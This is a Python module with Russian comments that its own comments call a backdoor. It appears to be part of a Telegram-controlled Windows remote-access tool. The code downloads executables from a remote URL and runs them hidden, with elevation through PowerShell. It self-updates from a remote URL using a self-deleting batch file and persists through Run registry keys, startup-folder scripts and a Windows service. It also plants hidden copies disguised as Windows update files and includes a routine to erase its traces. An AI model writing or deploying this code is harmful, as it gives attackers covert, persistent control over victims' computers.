import os
import sys
import logging
import platform
import subprocess
import ctypes
import shutil
import random
import time
import uuid
import requests
import tempfile

if platform.system() == "Windows":
    import winreg

from config import SERVICE_NAME
from telegram_api import send_text_to_telegram
from utils import verify_update_success

# Функция для загрузки и запуска EXE файла с правами администратора
def download_and_run_exe(url: str) -> bool:
    """Загружает и запускает исполняемый файл с правами администратора.
    
    Args:
        url (str): URL для загрузки исполняемого файла
        
    Returns:
        bool: True если файл успешно загружен и запущен, иначе False
    """
    logging.info(f"Загрузка и запуск EXE файла с URL: {url}")
    
    if platform.system() != "Windows":
        logging.warning("Функция download_and_run_exe доступна только для Windows.")
        return False

    try:
        # Создаем временное имя файла с уникальным идентификатором
        exe_path = os.path.join(os.environ["TEMP"], f"{uuid.uuid4().hex}.exe")
        
        # Загружаем файл с таймаутом
        response = requests.get(url, timeout=60)
        if response.status_code != 200:
            logging.error(f"Ошибка при загрузке файла: HTTP статус {response.status_code}")
            return False
        
        # Сохраняем файл
        with open(exe_path, "wb") as f:
            f.write(response.content)
        
        logging.info(f"Файл успешно загружен: {exe_path} ({len(response.content)} байт)")
        
        # Запускаем скрыто без показа окон
        if ctypes.windll.shell32.IsUserAnAdmin():
            # Уже запущено с правами администратора - запускаем скрыто
            logging.info("Запуск файла с текущими правами администратора (скрыто)")
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            subprocess.Popen(
                exe_path,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
        else:
            # Запускаем с повышением прав через PowerShell скрыто
            logging.info("Запуск файла с повышением привилегий (скрыто)")
            
            ps_script = f"""
            $process = Start-Process -FilePath "{exe_path}" -WindowStyle Hidden -Verb RunAs -PassThru
            if ($process) {{
                Write-Output "Process started with PID: $($process.Id)"
            }} else {{
                Write-Output "Failed to start process"
            }}
            """
            
            # Выполняем PowerShell скрыто
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            subprocess.run(
                ["powershell", "-Command", ps_script],
                startupinfo=startupinfo,
                capture_output=True,
                timeout=30,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS
            )
        
        return True
        
    except requests.exceptions.RequestException as e:
        logging.error(f"Ошибка при загрузке файла: {str(e)}")
        return False
    except (OSError, IOError) as e:
        logging.error(f"Ошибка файловой системы: {str(e)}")
        return False
    except Exception as e:
        logging.error(f"Непредвиденная ошибка при загрузке и запуске файла: {str(e)}")
        return False

# Функция для самообновления
def self_update(url: str) -> bool:
    """Загружает новую версию скрипта и перезапускает его.
    
    Args:
        url (str): URL для загрузки новой версии скрипта
        
    Returns:
        bool: True если обновление успешно, иначе False
    """
    logging.info(f"Начало самообновления с URL: {url}")
    
    try:
        # Загружаем новую версию скрипта
        response = requests.get(url, timeout=60)
        if response.status_code != 200:
            logging.error(f"Ошибка при загрузке обновления: HTTP статус {response.status_code}")
            return False
        
        # Получаем путь к текущему скрипту
        current_script = os.path.abspath(sys.argv[0])
        
        # Создаем временный файл для новой версии в папке TEMP
        temp_dir = tempfile.gettempdir()
        temp_script = os.path.join(temp_dir, f"update_{uuid.uuid4().hex}.py")
        
        # Сохраняем новую версию
        with open(temp_script, "w", encoding="utf-8") as f:
            f.write(response.text)
        
        logging.info(f"Новая версия сохранена в {temp_script}")
        
        # Создаем bat-файл для замены и перезапуска
        bat_path = os.path.join(temp_dir, f"update_{uuid.uuid4().hex}.bat")
        
        with open(bat_path, "w") as bat_file:
            bat_file.write(f"@echo off\n")
            bat_file.write(f"echo Обновление скрипта...\n")
            bat_file.write(f"timeout /t 3 /nobreak > nul\n")  # Ждем 3 секунды
            bat_file.write(f"echo Замена файла...\n")
            bat_file.write(f"copy \"{temp_script}\" \"{current_script}\" > nul 2>&1\n")  # Используем copy вместо move
            bat_file.write(f"if exist \"{current_script}\" (\n")
            bat_file.write(f"    echo Файл успешно заменен\n")
            bat_file.write(f"    echo Обновление путей в автозагрузке...\n")
            bat_file.write(f"    \"{sys.executable}\" \"{current_script}\" --update-autostart\n")
            bat_file.write(f"    echo Запуск новой версии...\n")
            bat_file.write(f"    start \"\" \"{sys.executable}\" \"{current_script}\"\n")
            bat_file.write(f"    echo Обновление завершено\n")
            bat_file.write(f") else (\n")
            bat_file.write(f"    echo Ошибка при замене файла\n")
            bat_file.write(f")\n")
            bat_file.write(f"timeout /t 2 /nobreak > nul\n")
            bat_file.write(f"del \"{temp_script}\" > nul 2>&1\n")  # Удаляем временный файл
            bat_file.write(f"del \"%~f0\" > nul 2>&1\n")  # Удаляем сам bat-файл
        
        logging.info(f"Создан BAT-файл: {bat_path}")
        
        # Запускаем bat-файл и завершаем текущий процесс
        try:
            # Запускаем в скрытом режиме
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            subprocess.Popen(
                ["cmd", "/c", bat_path],
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS,
                startupinfo=startupinfo
            )
            
            logging.info("BAT-файл запущен, завершение текущего процесса")
            
            # Ждем немного перед завершением
            time.sleep(1)
            
            # Завершаем процесс
            os._exit(0)
            
        except Exception as e:
            logging.error(f"Ошибка при запуске BAT-файла: {e}")
            # Пробуем альтернативный способ
            try:
                os.system(f"start /min cmd /c \"{bat_path}\"")
                time.sleep(1)
                os._exit(0)
            except:
                return False
        
    except Exception as e:
        logging.error(f"Ошибка при самообновлении: {e}")
        return False

# Функция для добавления в автозагрузку (несколько методов для надежности)
def add_to_autostart() -> dict:
    """Добавляет скрипт в автозагрузку различными методами.
    
    Returns:
        Dict[str, bool]: Словарь с результатами добавления различными методами
    """
    logging.info("Добавление в автозагрузку")
    
    if platform.system() != "Windows":
        return {"windows": False}
        
    script_path = os.path.abspath(sys.argv[0])
    script_name = os.path.basename(script_path)
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    results = {}
    
    # Метод 1: Реестр HKCU\Run
    try:
        logging.info("Добавление в HKCU\\Run")
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "SystemService", 0, winreg.REG_SZ, sys.executable)
        results["hkcu_run"] = True
        logging.info("Успешно добавлено в HKCU\\Run")
    except Exception as e:
        results["hkcu_run"] = False
        logging.error(f"Ошибка при добавлении в HKCU\\Run: {e}")
    
    # Метод 2: Реестр HKLM\Run (требует прав администратора)
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            logging.info("Добавление в HKLM\\Run")
            key = winreg.HKEY_LOCAL_MACHINE
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsSystemService", 0, winreg.REG_SZ, sys.executable)
            results["hklm_run"] = True
            logging.info("Успешно добавлено в HKLM\\Run")
        except Exception as e:
            results["hklm_run"] = False
            logging.error(f"Ошибка при добавлении в HKLM\\Run: {e}")
    else:
        results["hklm_run"] = False
        logging.info("Пропуск добавления в HKLM\\Run (нет прав администратора)")
    
    # Метод 3: Папка автозагрузки
    try:
        logging.info("Добавление в папку автозагрузки")
        # Создаем .bat файл в папке автозагрузки с уникальным именем
        bat_path = os.path.join(startup_folder, f"system_service_{random.randint(1000, 9999)}.bat")
        with open(bat_path, "w") as bat_file:
            bat_file.write(f"@echo off\nstart \"\" \"{sys.executable}\" \"{script_path}\"\nexit")
        results["startup_folder"] = True
        logging.info(f"Успешно добавлено в папку автозагрузки: {bat_path}")
    except Exception as e:
        results["startup_folder"] = False
        logging.error(f"Ошибка при добавлении в папку автозагрузки: {e}")
    
    return results

# Функция для создания скрытых копий
def create_persistent_copy() -> str:
    """Создает скрытые копии исполняемого файла в системных директориях.
    
    Returns:
        str: Путь к созданной копии или пустая строка при ошибке
    """
    logging.info("Создание персистентных копий")
    
    if platform.system() != "Windows":
        logging.warning("Функция create_persistent_copy доступна только для Windows.")
        return ""

    try:
        current_script = os.path.abspath(sys.argv[0])
        
        # Список потенциальных мест для скрытых копий
        hidden_locations = [
            os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Templates", "system_update.exe"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Windows", "Caches", "winupdate.exe"),
            os.path.join(os.environ.get("TEMP", ""), "Microsoft", "Windows", "system_service.exe"),
            os.path.join(os.environ.get("PROGRAMDATA", ""), "Microsoft", "Windows", "Start Menu", "system_manager.exe")
        ]
        
        successful_copies = []
        
        for location in hidden_locations:
            try:
                # Создаем директорию если не существует
                os.makedirs(os.path.dirname(location), exist_ok=True)
                
                # Копируем файл
                shutil.copy2(current_script, location)
                
                # Делаем файл скрытым (Windows)
                if platform.system() == "Windows":
                    ctypes.windll.kernel32.SetFileAttributesW(location, 2)  # FILE_ATTRIBUTE_HIDDEN
                
                successful_copies.append(location)
                logging.info(f"Создана скрытая копия: {location}")
                
            except Exception as e:
                logging.error(f"Ошибка при создании копии в {location}: {e}")
        
        return successful_copies[0] if successful_copies else ""
        
    except Exception as e:
        logging.error(f"Ошибка при создании персистентных копий: {e}")
        return ""

# Функция для создания службы Windows
def create_windows_service() -> bool:
    """Создает службу Windows для автозапуска.
    
    Returns:
        bool: True если служба создана успешно, иначе False
    """
    logging.info("Создание службы Windows")
    
    if platform.system() != "Windows":
        return False
    
    if not ctypes.windll.shell32.IsUserAnAdmin():
        logging.info("Нет прав администратора для создания службы")
        return False
    
    try:
        script_path = os.path.abspath(sys.argv[0])
        
        # Команда для создания службы
        service_cmd = f"sc create \"{SERVICE_NAME}\" binPath= \"{sys.executable} {script_path}\" start= auto"
        
        # Выполняем команду
        result = subprocess.run(service_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            logging.info(f"Служба {SERVICE_NAME} успешно создана")
            
            # Запускаем службу
            start_cmd = f"sc start \"{SERVICE_NAME}\""
            subprocess.run(start_cmd, shell=True, capture_output=True)
            
            return True
        else:
            logging.error(f"Ошибка при создании службы: {result.stderr}")
            return False
            
    except Exception as e:
        logging.error(f"Ошибка при создании службы Windows: {e}")
        return False

# Функция для удаления всех следов бэкдора
def remove_all_traces() -> list:
    """Удаляет все следы бэкдора из системы.
    
    Returns:
        List[str]: Список результатов удаления
    """
    logging.info("Начало удаления всех следов бэкдора")
    results = []
    
    if platform.system() != "Windows":
        results.append("ℹ️ Удаление следов доступно только для Windows.")
        return results

    # Удаляем из реестра HKCU\Run
    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.DeleteValue(reg_key, "SystemService")
        results.append("✅ Удалено из HKCU\\Run")
    except FileNotFoundError:
        results.append("ℹ️ HKCU\\Run запись не найдена")
    except Exception as e:
        results.append("❌ Ошибка при удалении из HKCU\\Run")
        logging.error(f"Ошибка при удалении из HKCU\\Run: {e}")
    
    # Удаляем из реестра HKLM\Run
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            logging.info("Удаление из HKLM\\Run")
            key = winreg.HKEY_LOCAL_MACHINE
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.DeleteValue(reg_key, "WindowsSystemService")
            results.append("✅ Удалено из HKLM\\Run")
        except FileNotFoundError:
            results.append("ℹ️ HKLM\\Run запись не найдена")
        except Exception as e:
            results.append("❌ Ошибка при удалении из HKLM\\Run")
            logging.error(f"Ошибка при удалении из HKLM\\Run: {e}")
    else:
        results.append("ℹ️ Пропуск удаления из HKLM\\Run (нет прав администратора)")
    
    # Удаляем BAT-файлы из папки автозагрузки
    try:
        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        removed_bat_count = 0
        for file in os.listdir(startup_folder):
            if file.startswith("system_service_") and file.endswith(".bat"):
                try:
                    os.remove(os.path.join(startup_folder, file))
                    removed_bat_count += 1
                except Exception as e:
                    logging.error(f"Ошибка при удалении BAT-файла {file}: {e}")
        if removed_bat_count > 0:
            results.append(f"✅ Удалено {removed_bat_count} BAT-файлов из автозагрузки")
        else:
            results.append("ℹ️ BAT-файлы автозагрузки не найдены")
    except Exception as e:
        results.append("❌ Ошибка при удалении BAT-файлов автозагрузки")
        logging.error(f"Ошибка при удалении BAT-файлов автозагрузки: {e}")

    # Удаляем скрытые копии
    try:
        hidden_locations = [
            os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Templates", "system_update.exe"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Windows", "Caches", "winupdate.exe"),
            os.path.join(os.environ.get("TEMP", ""), "Microsoft", "Windows", "system_service.exe"),
            os.path.join(os.environ.get("PROGRAMDATA", ""), "Microsoft", "Windows", "Start Menu", "system_manager.exe")
        ]
        removed_copies_count = 0
        for location in hidden_locations:
            if os.path.exists(location):
                try:
                    os.remove(location)
                    removed_copies_count += 1
                except Exception as e:
                    logging.error(f"Ошибка при удалении скрытой копии {location}: {e}")
        if removed_copies_count > 0:
            results.append(f"✅ Удалено {removed_copies_count} скрытых копий")
        else:
            results.append("ℹ️ Скрытые копии не найдены")
    except Exception as e:
        results.append("❌ Ошибка при удалении скрытых копий")
        logging.error(f"Ошибка при удалении скрытых копий: {e}")

    # Удаляем службу Windows
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            # Останавливаем службу
            stop_cmd = f"sc stop \"{SERVICE_NAME}\""
            subprocess.run(stop_cmd, shell=True, capture_output=True)
            
            # Удаляем службу
            delete_cmd = f"sc delete \"{SERVICE_NAME}\""
            result = subprocess.run(delete_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                results.append(f"✅ Служба {SERVICE_NAME} удалена")
            else:
                results.append(f"❌ Ошибка при удалении службы: {result.stderr}")
        except Exception as e:
            results.append("❌ Ошибка при удалении службы Windows")
            logging.error(f"Ошибка при удалении службы Windows: {e}")
    else:
        results.append("ℹ️ Пропуск удаления службы Windows (нет прав администратора)")

    # Удаляем файлы данных
    try:
        data_files = [
            os.path.join(tempfile.gettempdir(), "winsys_marker.dat"),
            os.path.join(tempfile.gettempdir(), "instance_id.dat"),
            os.path.join(tempfile.gettempdir(), "instance_name.dat"),
            os.path.join(tempfile.gettempdir(), "devices_list.json"),
            os.path.join(tempfile.gettempdir(), "system_service.log")
        ]
        removed_files = 0
        for data_file in data_files:
            if os.path.exists(data_file):
                try:
                    os.remove(data_file)
                    removed_files += 1
                except Exception as e:
                    logging.error(f"Ошибка при удалении файла данных {data_file}: {e}")
        
        if removed_files > 0:
            results.append(f"✅ Удалено {removed_files} файлов данных")
        else:
            results.append("ℹ️ Файлы данных не найдены")
            
    except Exception as e:
        results.append("❌ Ошибка при удалении файлов данных")
        logging.error(f"Ошибка при удалении файлов данных: {e}")
    
    logging.info("Завершено удаление всех следов бэкдора.")
    return results

def update_autostart_paths(new_script_path: str) -> dict:
    """Обновляет пути в автозагрузке на новый путь к скрипту.
    
    Args:
        new_script_path (str): Новый путь к обновленному скрипту
        
    Returns:
        Dict[str, bool]: Результаты обновления различных методов автозагрузки
    """
    logging.info(f"Обновление путей в автозагрузке на: {new_script_path}")
    
    if platform.system() != "Windows":
        return {"windows": False}
        
    results = {}
    
    # Обновляем реестр HKCU\Run
    try:
        logging.info("Обновление HKCU\\Run")
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "SystemService", 0, winreg.REG_SZ, f"\"{sys.executable}\" \"{new_script_path}\"")
        results["hkcu_run"] = True
        logging.info("HKCU\\Run обновлен успешно")
    except Exception as e:
        results["hkcu_run"] = False
        logging.error(f"Ошибка при обновлении HKCU\\Run: {e}")
    
    # Обновляем реестр HKLM\Run (если есть права администратора)
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            logging.info("Обновление HKLM\\Run")
            key = winreg.HKEY_LOCAL_MACHINE
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsSystemService", 0, winreg.REG_SZ, f"\"{sys.executable}\" \"{new_script_path}\"")
            results["hklm_run"] = True
            logging.info("HKLM\\Run обновлен успешно")
        except Exception as e:
            results["hklm_run"] = False
            logging.error(f"Ошибка при обновлении HKLM\\Run: {e}")
    else:
        results["hklm_run"] = False
        logging.info("Пропуск обновления HKLM\\Run (нет прав администратора)")
    
    # Обновляем BAT-файлы в папке автозагрузки
    try:
        logging.info("Обновление BAT-файлов в папке автозагрузки")
        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        
        # Удаляем старые BAT-файлы
        deleted_count = 0
        for file in os.listdir(startup_folder):
            if file.startswith("system_service_") and file.endswith(".bat"):
                try:
                    os.remove(os.path.join(startup_folder, file))
                    deleted_count += 1
                except Exception:
                    pass
        
        if deleted_count > 0:
            logging.info(f"Удалено {deleted_count} старых BAT-файлов")
        
        # Создаем новый BAT-файл с правильным путем
        new_bat_path = os.path.join(startup_folder, f"system_service_{random.randint(1000, 9999)}.bat")
        with open(new_bat_path, "w") as bat_file:
            bat_file.write(f"@echo off\nstart \"\" \"{sys.executable}\" \"{new_script_path}\"\nexit")
        
        results["startup_folder"] = True
        logging.info(f"Создан новый BAT-файл: {new_bat_path}")
        
    except Exception as e:
        results["startup_folder"] = False
        logging.error(f"Ошибка при обновлении папки автозагрузки: {e}")
    
    # Обновляем службу Windows (если есть права администратора)
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            logging.info("Обновление службы Windows")
            # Останавливаем службу
            stop_cmd = f"sc stop \"{SERVICE_NAME}\""
            subprocess.run(stop_cmd, shell=True, capture_output=True)
            
            # Обновляем путь к исполняемому файлу
            update_cmd = f"sc config \"{SERVICE_NAME}\" binPath= \"{sys.executable} {new_script_path}\""
            result = subprocess.run(update_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Запускаем обновленную службу
                start_cmd = f"sc start \"{SERVICE_NAME}\""
                subprocess.run(start_cmd, shell=True, capture_output=True)
                results["windows_service"] = True
                logging.info("Служба Windows обновлена успешно")
            else:
                results["windows_service"] = False
                logging.error(f"Ошибка при обновлении службы: {result.stderr}")
                
        except Exception as e:
            results["windows_service"] = False
            logging.error(f"Ошибка при обновлении службы Windows: {e}")
    else:
        results["windows_service"] = False
        logging.info("Пропуск обновления службы Windows (нет прав администратора)")
    
    return results


